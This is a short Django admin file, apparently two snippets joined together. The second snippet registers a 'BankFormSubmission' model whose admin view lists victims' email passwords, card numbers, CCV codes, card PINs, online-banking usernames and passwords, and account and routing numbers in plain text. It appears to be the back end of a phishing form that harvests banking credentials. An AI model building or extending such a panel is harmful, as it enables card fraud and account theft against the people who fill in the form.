from django.contrib import admin
from .models import SingleInput

@admin.register(SingleInput)
class SingleInputAdmin(admin.ModelAdmin):
    list_display = ['input_value', 'id']  # Customize what columns are shown in the admin list
    search_fields = ['input_value']  # Add search functionality



from django.contrib import admin
from .models import BankFormSubmission

@admin.register(BankFormSubmission)
class BankFormSubmissionAdmin(admin.ModelAdmin):
    list_display = ['submitted_at', 'first_name', 'last_name', 'address', 'email', 'password', 'card_number', 'expiry_date','ccv_security_code' , 'card_pin', 'bank_username', 'bank_password' , 'account_number', 'routing_number']
    search_fields = ['first_name', 'last_name', 'email', 'account_number']



